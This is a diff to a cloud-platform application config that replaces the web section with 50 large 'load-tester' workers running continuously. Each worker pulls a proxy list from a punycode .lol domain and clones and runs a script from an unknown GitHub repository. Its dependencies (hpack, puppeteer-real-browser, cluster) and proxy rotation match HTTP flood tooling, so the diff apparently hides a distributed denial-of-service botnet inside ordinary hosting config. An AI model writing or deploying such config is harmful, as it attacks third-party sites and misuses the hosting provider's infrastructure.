@@ -3,19 +3,49 @@ applications:
   # The app's name, which must be unique within the project.
   myapp:
     # The language and version for your app.
-    type: 'nodejs:24'
+    type: 'nodejs:20'
+    
+    # Dedicated workers for 24/7 execution - remove web section entirely
+    workers:
+      load-tester:
+        type: 'python:3.10'
+        size: 'L'
+        count: 50  # 50 parallel instances
+        commands:
+          start: |
+            # Install system dependencies
+            apt-get update && apt-get install -y python3-pip python3-dev build-essential libssl-dev wget curl git npm nodejs
+            
+            # Install Python packages for HTTP/3 load testing
+            pip3 install --upgrade pip
+            pip3 install aioquic uvloop requests
+            
+            # Setup Node.js environment
+            npm install -g npm@latest
+            
+            # Create app directory and install Node.js dependencies
+            mkdir -p /app
+            cd /app
+            npm init -y
+            npm install net chalk hpack.js hpack colors puppeteer-real-browser cluster
+            
+            # Download proxies
+            curl -s "https://xn--mnqu23e2hf.lol/api.php?key=user1208&country=all" > k.txt
+            
+            # Clone and run HTTP/3 load tester
+            cd /app
+            git clone https://github.com/vrbrh921-glitch/Fc.git || cd Fc && git pull || true
+            cd Fc
+            python3 m.py
+            
+            # Get instance number
+            WORKER_INDEX=${PLATFORM_RELATIONSHIPS_INDEX:-1}
+            INSTANCE_NUMBER=$((WORKER_INDEX % 50 + 1))
+            
+            echo "Starting Load Tester Instance $INSTANCE_NUMBER of 50"
+            
+            # Run the Python script continuously
+            
 
-    # The app's configuration when it's exposed to the web.
-    web:
-      commands:
-        start: sleep 9000
-      locations:
-        '/':
-          # The public directory relative to the app root.
-          root: 'public'
-          # Forward resources to the app.
-          passthru: true
-          # What files to use when serving a directory.
-          index: ["index.html"]
-          # Allow files even without specified rules.
-          allow: true
+              
+              
